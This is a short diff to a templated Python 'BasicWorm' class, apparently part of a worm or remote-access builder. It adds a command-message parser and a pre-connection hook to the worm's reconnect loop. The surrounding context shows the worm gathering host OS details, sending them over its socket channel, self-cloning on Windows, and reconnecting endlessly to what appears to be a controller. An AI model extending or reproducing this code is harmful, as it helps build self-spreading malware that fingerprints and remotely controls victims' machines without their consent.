@@ -101,6 +101,15 @@ class BasicWorm:
         msg = self.sys_msg + self.sys_msg.join(cmd) + self.sys_msg
         return msg
     
+    def unpackSysMsg(self, msg: str) -> list:
+        msg = msg.split(self.sys_msg)
+        cmd = []
+        for c in msg:
+            if c == "" or c == " ":
+                continue
+            cmd.append(c)
+        return cmd
+    
 
     def getSysInfo(self) -> None:
         self._sysInfo = f"{platform.system()} ## {platform.release()}"
@@ -120,6 +129,9 @@ class BasicWorm:
                 info[i] = "Unknown"
         info = self.makeSysMsg(info)
         self.sendMsg(info)
+    
+    def _preConn(self) -> None:
+        pass
 
 {%if INFECT_WIN %}
     
@@ -171,6 +183,7 @@ class BasicWorm:
 {%if INFECT_WIN%}
         self.cloneMe()
 {%endif%}
+        self._preConn()
         while True:
             if not self.buildSocket():
                 sleep(self.pause_conn)
